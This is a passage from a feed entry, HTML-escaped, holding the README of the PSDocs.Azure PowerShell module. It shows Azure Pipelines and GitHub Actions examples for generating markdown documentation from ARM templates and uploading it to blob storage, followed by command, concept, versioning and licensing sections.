# Generate a standard name of the markdown file. i.e. &amp;lt;name&amp;gt;_&amp;lt;version&amp;gt;.md&#xA;        $template = Get-Item -Path $_.TemplateFile;&#xA;        $templateName = $template.Directory.Parent.Name;&#xA;        $version = $template.Directory.Name;&#xA;        $docName = &#34;$($templateName)_$version&#34;;&#xA;        # Generate markdown&#xA;        Invoke-PSDocument -Module PSDocs.Azure -OutputPath out/docs/ -InputObject $template.FullName -InstanceName $docName;&#xA;      }&#xA;    displayName: &#39;Export template data&#39;&#xA;    &#xA;  # STEP 2: Copy files to a storage account&#xA;  - task: AzureFileCopy@4&#xA;    displayName: &#39;Copy files to a storage account blob container&#39;&#xA;    inputs:&#xA;      SourcePath: &#39;out/docs/*&#39;&#xA;      azureSubscription: &#39;psdocstest&#39;&#xA;      Destination: &#39;AzureBlob&#39;&#xA;      storage: &#39;&amp;lt;storageaccountname&amp;gt;&#39; &#xA;      ContainerName: &#39;ps-docs&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Using with GitHub Actions&lt;/h3&gt; &#xA;&lt;p&gt;The following example shows how to setup GitHub Actions to copy generated markdown files to an Azure blob storage account.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;See &lt;a href=&#34;https://help.github.com/en/articles/configuring-a-workflow#creating-a-workflow-file&#34;&gt;Creating a workflow file&lt;/a&gt; to create an empty workflow file.&lt;/li&gt; &#xA; &lt;li&gt;Add a PowerShell step to: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Install &lt;a href=&#34;https://www.powershellgallery.com/packages/PSDocs.Azure&#34;&gt;PSDocs.Azure&lt;/a&gt; module.&lt;/li&gt; &#xA;   &lt;li&gt;Scan for Azure template file recursively in the templates/ directory.&lt;/li&gt; &#xA;   &lt;li&gt;Generate a standard name of the markdown file. i.e. &lt;code&gt;&amp;lt;name&amp;gt;_&amp;lt;version&amp;gt;&lt;/code&gt;.md&lt;/li&gt; &#xA;   &lt;li&gt;Generate the markdown to a specific directory.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;Set the &lt;code&gt;STORAGEACCOUNTSECRET&lt;/code&gt; action secret.&lt;/li&gt; &#xA; &lt;li&gt;Use an &lt;a href=&#34;https://github.com/marketplace/actions/azure-blob-storage-upload&#34;&gt;Azure Blob Storage Upload action&lt;/a&gt; to copy the generated markdown to an Azure Storage Blob container.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;For example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;# Example: .github/workflows/arm-docs.yaml&#xA;&#xA;name: Generate ARM templates docs&#xA;on:&#xA;  push:&#xA;    branches: [ main ]&#xA;jobs:&#xA;  arm_docs:&#xA;    name: Generate ARM template docs&#xA;    runs-on: ubuntu-latest&#xA;    steps:&#xA;    - name: Checkout&#xA;      uses: actions/checkout@v2&#xA;    # STEP 1: Generate Markdowns using PSDocs&#xA;    - name: Generate ARM markdowns&#xA;      run: | &#xA;        Install-Module -Name &#39;PSDocs.Azure&#39; -Repository PSGallery -force;&#xA;        # Scan for Azure template file recursively in the templates/ directory&#xA;        Get-AzDocTemplateFile -Path templates/ | ForEach-Object {&#xA;          # Generate a standard name of the markdown file. i.e. &amp;lt;name&amp;gt;_&amp;lt;version&amp;gt;.md&#xA;          $template = Get-Item -Path $_.TemplateFile;&#xA;          $templateName = $template.Directory.Parent.Name;&#xA;          $version = $template.Directory.Name;&#xA;          $docName = &#34;$($templateName)_$version&#34;;&#xA;          # Generate markdown&#xA;          Invoke-PSDocument -Module PSDocs.Azure -OutputPath out/docs/ -InputObject $template.FullName -InstanceName $docName;&#xA;        }&#xA;      shell: pwsh&#xA;&#xA;    # STEP 2: Copy files to a storage account&#xA;    - name: Copy files to a storage account&#xA;      uses: bacongobbler/azure-blob-storage-upload@v1.1.1&#xA;      with:&#xA;        connection_string: ${{ secrets.STORAGEACCOUNTSECRET }}&#xA;        container_name: ps-docs&#xA;        source_dir: &#39;out/docs/*&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Language reference&lt;/h2&gt; &#xA;&lt;p&gt;PSDocs for Azure extends PowerShell with the following cmdlets and concepts.&lt;/p&gt; &#xA;&lt;h3&gt;Commands&lt;/h3&gt; &#xA;&lt;p&gt;The following commands exist in the &lt;code&gt;PSDocs.Azure&lt;/code&gt; module:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/docs/commands/en-US/Get-AzDocTemplateFile.md&#34;&gt;Get-AzDocTemplateFile&lt;/a&gt; - Get Azure template files within a directory structure.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Concepts&lt;/h3&gt; &#xA;&lt;p&gt;The following conceptual topics exist in the &lt;code&gt;PSDocs.Azure&lt;/code&gt; module:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/docs/concepts/en-US/about_PSDocs_Azure_Badges.md&#34;&gt;Badges&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/docs/concepts/en-US/about_PSDocs_Azure_Configuration.md&#34;&gt;Configuration&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/docs/concepts/en-US/about_PSDocs_Azure_Configuration.md#azure_snippet_skip_default_value_fn&#34;&gt;AZURE_SNIPPET_SKIP_DEFAULT_VALUE_FN&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/docs/concepts/en-US/about_PSDocs_Azure_Configuration.md#azure_snippet_skip_optional_parameter&#34;&gt;AZURE_SNIPPET_SKIP_OPTIONAL_PARAMETER&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/docs/concepts/en-US/about_PSDocs_Azure_Configuration.md#azure_use_parameter_file_snippet&#34;&gt;AZURE_USE_PARAMETER_FILE_SNIPPET&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/docs/concepts/en-US/about_PSDocs_Azure_Configuration.md#azure_use_command_line_snippet&#34;&gt;AZURE_USE_COMMAND_LINE_SNIPPET&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/docs/concepts/en-US/about_PSDocs_Azure_Conventions.md&#34;&gt;Conventions&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/docs/concepts/en-US/about_PSDocs_Azure_Conventions.md#azurenamebyparentpath&#34;&gt;Azure.NameByParentPath&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Changes and versioning&lt;/h2&gt; &#xA;&lt;p&gt;Modules in this repository will use the &lt;a href=&#34;http://semver.org/&#34;&gt;semantic versioning&lt;/a&gt; model to declare breaking changes from v1.0.0. Prior to v1.0.0, breaking changes may be introduced in minor (0.x.0) version increments. For a list of module changes please see the &lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/CHANGELOG.md&#34;&gt;change log&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Pre-release module versions are created on major commits and can be installed from the PowerShell Gallery. Pre-release versions should be considered experimental. Modules and change log details for pre-releases will be removed as standard releases are made available.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;This project welcomes contributions and suggestions. If you are ready to contribute, please visit the &lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/CONTRIBUTING.md&#34;&gt;contribution guide&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Code of Conduct&lt;/h2&gt; &#xA;&lt;p&gt;This project has adopted the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/&#34;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&#34;https://opensource.microsoft.com/codeofconduct/faq/&#34;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&#34;mailto:opencode@microsoft.com&#34;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt; &#xA;&lt;h2&gt;Maintainers&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/BernieWhite&#34;&gt;Bernie White&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/vicperdana&#34;&gt;Vic Perdana&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;This project is &lt;a href=&#34;https://raw.githubusercontent.com/Azure/PSDocs.Azure/main/LICENSE&#34;&gt;licensed under the MIT License&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
</feed>